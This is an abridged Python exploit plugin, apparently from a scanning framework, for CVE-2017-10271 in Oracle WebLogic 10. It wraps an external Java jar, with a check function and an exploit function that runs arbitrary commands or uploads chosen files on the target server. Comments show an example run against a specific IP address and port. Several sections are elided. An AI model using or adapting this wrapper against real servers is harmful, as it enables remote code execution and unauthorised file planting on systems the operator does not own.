...
def vuln_info():
    info={
        'vuln_name': 'CVE-2017-10271 Weblogic10',  #漏洞名称
...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    ...
    #Error_Info无论何时都会输出
        ...
        popen = subprocess.Popen(['java', '-jar', weblogicPath,'CVE-2017-10271 Weblogic10',"c",url, "","",""], stdout=subprocess.PIPE)
        echo = popen.stdout.read()
        if "vuln" in echo.decode():
            print("cunzai " + echo.decode())
            result['Result'] = True
...
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    ...
    #Error_Info无论何时都会输出
        ...
        if exp_data['type']=='cmd':
            popen = subprocess.Popen(['java', '-jar', weblogicPath,'CVE-2017-10271 Weblogic10',"m", url,exp_data['command'],"",""], stdout=subprocess.PIPE)
            echo = popen.stdout.read()
            print(echo)
            #"CVE-2017-10271 Weblogic10" "u" "http://123.58.236.76:40928" "id" "xiaoheitext.txt" "111"
            result['Result'] = True
        ...
        if exp_data['type']=='uploadfile':
            popen = subprocess.Popen(['java', '-jar', weblogicPath,'CVE-2017-10271 Weblogic10',"u",url ,"",exp_data['filename'],exp_data['filename_contents']], stdout=subprocess.PIPE)
            echo = popen.stdout.read()
            print(echo)
            #"CVE-2017-10271 Weblogic10" "u" "http://123.58.236.76:40928" "id" "xiaoheitext.txt" "111"
            result['Result'] = True
